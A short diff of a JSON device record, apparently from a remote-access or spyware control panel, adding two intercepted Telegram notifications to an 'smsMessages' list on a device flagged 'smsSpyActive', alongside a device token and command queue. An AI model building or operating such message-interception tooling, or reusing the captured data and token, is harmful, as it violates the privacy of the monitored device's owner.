@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777066972694,
+    "lastSeen": 1777066987703,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "𝙎𝙝𝙤𝙥 𝙉𝙪𝙢𝙗𝙚𝙧𝙤𝙏𝙂: Anda",
+        "content": "彙𝟓𝟎𝟓 || bergabung ke grup 𝙎𝙝𝙤𝙥 𝙉𝙪𝙢𝙗𝙚𝙧𝙤𝙏𝙂",
+        "time": "25/04 04:42",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777066974328
+      },
+      {
+        "appName": "Telegram",
+        "sender": "BOT GACHA ITEM VIP",
+        "content": "🎁 KODE REDEEM BARU!\n\n📌 Kode: J74H5QO9\n💎 Bonus: +1 Limit\n⏰ Berlaku 24 jam\n\n/redeem J74H5QO9",
+        "time": "25/04 04:42",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777066974321
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
